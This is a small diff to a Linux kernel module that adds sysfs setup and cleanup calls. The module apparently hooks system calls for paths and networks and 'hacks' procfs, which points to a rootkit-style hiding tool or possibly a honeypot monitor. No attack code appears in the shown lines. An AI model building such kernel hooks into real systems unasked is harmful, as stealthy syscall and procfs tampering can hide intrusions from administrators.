@@ -26,6 +26,7 @@
 #include "syscalls/paths.h"
 #include "syscalls/networks.h"
 #include "proc/procfs_hack.h"
+#include "sysfs/sysfs.h"
 
 MODULE_LICENSE("GPL");
 
@@ -51,6 +52,11 @@ int init_module()
     printk(KERN_ALERT "procfs hack failed.\n");
   }
 
+  if (hp_init_sysfs()) {
+    printk(KERN_ALERT "sysfs initialization failed.\n");
+  }
+
+
   return 0;
 }
 
@@ -70,6 +76,10 @@ void cleanup_module()
 
   if (cleanup_proc_hacking()) {
     printk(KERN_ALERT "procfs restoring failed.\n");
+  }
+
+  if (hp_cleanup_sysfs()) {
+    printk(KERN_ALERT "cleanup sysfs %s was failed.\n", HP_DIR_NAME);
   }
   return;
 }
